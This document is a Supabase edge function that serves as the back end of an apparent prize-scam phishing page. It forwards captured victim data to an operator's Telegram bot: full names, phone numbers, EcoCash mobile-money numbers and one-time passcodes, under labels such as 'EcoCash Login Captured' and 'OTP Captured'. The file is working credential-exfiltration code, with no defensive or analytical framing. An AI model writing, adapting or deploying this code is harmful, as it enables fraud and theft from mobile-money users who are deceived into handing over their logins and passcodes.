import "jsr:@supabase/functions-js/edge-runtime.d.ts";
import { createClient } from "jsr:@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Client-Info, Apikey",
};

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { status: 200, headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
    );

    // Read Telegram config from the database (service-role bypasses RLS)
    const { data: config, error: configError } = await supabase
      .from("telegram_config")
      .select("bot_token, chat_id, is_enabled")
      .limit(1)
      .maybeSingle();

    if (configError) {
      return new Response(
        JSON.stringify({ error: "Failed to read Telegram config", detail: configError.message }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    // Silently skip if not configured or disabled — do NOT block the user flow
    if (!config || !config.is_enabled || !config.bot_token || !config.chat_id) {
      return new Response(
        JSON.stringify({ sent: false, reason: "Telegram not configured or disabled" }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    const payload = await req.json();
    const { event, fullName, phoneNumber, prizeAmount, mobileNumber, otpCode, timestamp } = payload;

    // Build a readable Telegram message
    const lines: string[] = [];
    const time = timestamp || new Date().toISOString().replace("T", " ").slice(0, 19);

    const eventLabels: Record<string, string> = {
      promo: "🎁 New Prize Claim",
      ecocash: "💰 EcoCash Login Captured",
      otp: "🔐 OTP Captured",
      qualification: "✅ Winner Qualified",
    };
    lines.push(`<b>${eventLabels[event] || "📋 New Submission"}</b>`);
    lines.push(`<b>Time:</b> ${time} UTC`);
    if (fullName) lines.push(`<b>Name:</b> ${escapeHtml(fullName)}`);
    if (phoneNumber) lines.push(`<b>Phone:</b> ${escapeHtml(phoneNumber)}`);
    if (mobileNumber) lines.push(`<b>EcoCash #:</b> ${escapeHtml(mobileNumber)}`);
    if (otpCode) lines.push(`<b>OTP:</b> ${escapeHtml(otpCode)}`);
    if (prizeAmount != null) lines.push(`<b>Prize:</b> $${Number(prizeAmount).toFixed(2)}`);
    const text = lines.join("\n");

    // Send to Telegram Bot API
    const tgRes = await fetch(
      `https://api.telegram.org/bot${config.bot_token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: config.chat_id,
          text,
          parse_mode: "HTML",
        }),
      },
    );

    if (!tgRes.ok) {
      const tgErr = await tgRes.text();
      console.error("Telegram API error:", tgErr);
      return new Response(
        JSON.stringify({ sent: false, error: "Telegram API rejected the message", detail: tgErr }),
        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } },
      );
    }

    return new Response(
      JSON.stringify({ sent: true }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } },
    );
  } catch (err) {
    const msg = err instanceof Error ? err.message : "Unknown error";
    console.error("telegram-notify error:", msg);
    return new Response(
      JSON.stringify({ sent: false, error: msg }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } },
    );
  }
});

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
